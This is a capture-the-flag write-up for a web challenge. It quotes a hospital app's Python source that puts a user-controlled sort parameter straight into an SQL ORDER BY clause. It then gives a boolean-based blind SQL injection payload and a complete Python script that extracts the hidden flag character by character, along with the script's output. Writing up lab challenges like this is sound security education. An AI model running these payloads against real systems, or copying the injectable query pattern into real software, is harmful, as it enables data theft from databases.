# FortID CTF Doctor Bye Bye - Web Exploitation

I joined this CTF right before the end, and this was the only challenge I looked at.

## Description
```
Dr. Bye Bye has retired from St. Codd's Hospital.

The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?
```

## Finding the vulnerability

The source code for the web application was handed out, so I started out by looking through that. I noticed an **SQL injection** vulnerability in the code. 
 
Here are the most important parts:

```python
def initialize_database(flag):
    DATABASE.unlink(missing_ok=True)
    connection = sqlite3.connect(DATABASE)
    try:
        connection.executescript(
            """
            CREATE TABLE doctors (
                id INTEGER PRIMARY KEY,
                slug TEXT NOT NULL UNIQUE,
                name TEXT NOT NULL,
                specialty TEXT NOT NULL,
                room TEXT NOT NULL,
                listed INTEGER NOT NULL CHECK (listed IN (0, 1)),
                farewell_note TEXT
            );

            INSERT INTO doctors VALUES
                (10, 'ada-pulse', 'Dr. Ada Pulse', 'Cardiology', 'C-101', 1, NULL),
                (30, 'max-well', 'Dr. Max Well', 'Radiology', 'R-204', 1, NULL),
                (50, 'paige-turner', 'Dr. Paige Turner', 'Neurology', 'N-303', 1, NULL),
                (70, 'ella-ment', 'Dr. Ella Ment', 'Pathology', 'P-118', 1, NULL),
                (90, 'zoe-last', 'Dr. Zoe Last', 'Emergency medicine', 'E-001', 1, NULL);
            """,
        )
        connection.execute(
            "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
            (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
        )
        connection.commit()
    finally:
        connection.close()
```
The flag is the farewell_note of doctor-bye-bye

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

An SQL injection is present here if I can control order_expression

```python
def do_GET(self):
    request = urlsplit(self.path)
        # Other paths here
        if request.path == "/api/on-call":
            parameters = parse_qs(request.query, keep_blank_values=True)
            order_expression = parameters.get("sort", ["name"])[0]
            if not order_expression or len(order_expression) > 600:
                self.send_json(400, {"error": "Invalid schedule preference."})
                return
            try:
                doctor = select_on_call(order_expression)
            except (sqlite3.Error, LookupError):
                # Query errors deliberately do not expose database details.
                self.send_json(400, {"error": "The on-call board could not be updated."})
                return
            self.send_json(200, {"doctor": doctor})
            return
```

By making a GET request to the path /api/on-call I can control the parameter sort, which is then used in order_expression. This way I get control over the ORDER BY clause.  

I spawned an instance and compared the responses of these two requests:

`https://website/api/on-call?sort=1%20DESC`
This returned Ada

`https://website/api/on-call?sort=1%20ASC`
This returned Zoe

Since the query returns only one doctor (LIMIT 1), sorting by name in ascending order returns Dr. Ada Pulse, while descending order returns Dr. Zoe Last.

## Solution

For extracting the flag I used a Boolean Based Blind SQL Injection. This allowed me to extract the flag one character at a time. I figured I could do this by using the response Ada as a sign of success and Zoe as a sign of failure. I got this idea because I have made a similar challenge myself in the past. 

I found this portswigger article about [SQL injections in ORDER BY clauses](https://portswigger.net/support/sql-injection-in-the-query-structure)

I used this info to create a query that fit this challenge

```sql
CASE WHEN (SELECT SUBSTRING(farewell_note, 1, 1) FROM doctors WHERE listed = 0 LIMIT 1) = 'F' THEN name END ASC, CASE WHEN (SELECT SUBSTRING(farewell_note, 1, 1) FROM doctors WHERE listed = 0 LIMIT 1) <> 'F' THEN name END DESC
```
This example checks if the first letter of the farewell_note of the first doctor with listed = 0 (only doctor-bye-bye had listed=0) is equal to F. 
If the condition is true, the first CASE expression sorts the doctors by name in ascending order. Otherwise, the second CASE expression sorts them in descending order.

This means:
If the first character is F
    Response will be Ada
else
    Response will be Zoe

We can use this for extracting the whole flag, by changing the values of the length of the substrings in the statements from 1,1 to 1,2, 1,3 and so on. Instead of checking individual characters, I compare the entire recovered prefix plus one guessed character against the beginning of the flag.

Here is the python script I used for automating this process:

```python
import requests

r = "https://website/api/on-call"
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_-{}"

s = requests.Session()

def get_flag():
    flag = ""
    for i in range(50):
        for char in alphabet:
            p2 = f"""CASE
                WHEN (
                    SELECT SUBSTRING(farewell_note, 1, {i+1})
                    FROM doctors
                    WHERE listed = 0
                    LIMIT 1
                ) = '{flag + char}'
                THEN name
            END ASC,
            CASE
                WHEN (
                    SELECT SUBSTRING(farewell_note, 1, {i+1})
                    FROM doctors
                    WHERE listed = 0
                    LIMIT 1
                ) <> '{flag + char}'
                THEN name
            END DESC"""
            res = s.get(r, params={"sort": p2})
            if "Ada" in res.text:
                flag += char
                print(f"flag = {flag}")
                if char == "}":
                    print(flag)
                    return
                break

if __name__ == "__main__":
    get_flag()
```

## Flag

The script gave the following output:

```
marv1nh@T14s:~/writeups$ python3 solve.py 
flag = F
flag = Fo
flag = For
flag = Fort
flag = FortI
flag = FortID
flag = FortID{
flag = FortID{D
flag = FortID{D0
flag = FortID{D0C
flag = FortID{D0C_
flag = FortID{D0C_1
flag = FortID{D0C_1M
flag = FortID{D0C_1M_
flag = FortID{D0C_1M_0
flag = FortID{D0C_1M_0U
flag = FortID{D0C_1M_0UT
flag = FortID{D0C_1M_0UTT
flag = FortID{D0C_1M_0UTT4
flag = FortID{D0C_1M_0UTT4_
flag = FortID{D0C_1M_0UTT4_H
flag = FortID{D0C_1M_0UTT4_H3
flag = FortID{D0C_1M_0UTT4_H3R
flag = FortID{D0C_1M_0UTT4_H3R3
flag = FortID{D0C_1M_0UTT4_H3R3_
flag = FortID{D0C_1M_0UTT4_H3R3_6
flag = FortID{D0C_1M_0UTT4_H3R3_6a
flag = FortID{D0C_1M_0UTT4_H3R3_6ae
flag = FortID{D0C_1M_0UTT4_H3R3_6aec
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1e
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1e8
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1e86
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1e86c
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1e86cc
flag = FortID{D0C_1M_0UTT4_H3R3_6aec1e86cc}
FortID{D0C_1M_0UTT4_H3R3_6aec1e86cc}
```